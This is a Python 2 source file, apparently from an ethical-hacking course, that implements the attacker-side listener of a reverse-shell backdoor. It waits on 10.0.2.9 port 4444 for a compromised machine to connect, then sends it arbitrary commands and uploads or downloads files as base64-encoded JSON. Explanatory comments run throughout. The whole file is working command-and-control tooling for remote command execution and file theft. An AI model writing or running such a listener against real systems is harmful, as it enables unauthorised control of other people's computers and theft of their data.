#!/usr/bin/env python

import socket   # socket library is used to stablish connections and pass data and uses tcp sockets
import json   # (JSON -> JavaScript Object Notation)It is a way of converting the data structures into text/strin
import base64


class Listener:
    def __init__(self, ip, port):  # Constructor
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM ->> tcp connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Changing option -> After this socket can be reused after connection drops
        # setsockopt(Level, Attribute/Option, enable[1]) -> to set socket option
        listener.bind((ip, port))   # Binding the listener with given IP and  port
        # Binding socket to our computer to listen for incoming connection on port 4444
        listener.listen(0)
        # Number of connection that can be queued before it starts getting refuse
        print("[+] Waiting for incoming connection.")
        self.connection, address = listener.accept()
        # Accept the connection using accept() which returns connection(socket object) and  address
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):  # To send data after packaging i.e, json packaging
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):   # To receive json packed data
        json_data = ""
        while True:  # Using while loop for receiving file completely
            try:
                json_data = json_data + self.connection.recv(1024)  # Combining the received data packets
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):  # Sending the file
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Decoding data encoded with base64 algorithm
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())  # Encoding data decoded with base64 algorithm

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)  # Appending file content into command(list)

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                try:
                    result = "[-] Error during command execution, no file found named -->" + command[1]
                except IndexError:
                    result = "[-] Incomplete command."

            print(result)


my_listener = Listener("10.0.2.9", 4444)
my_listener.run()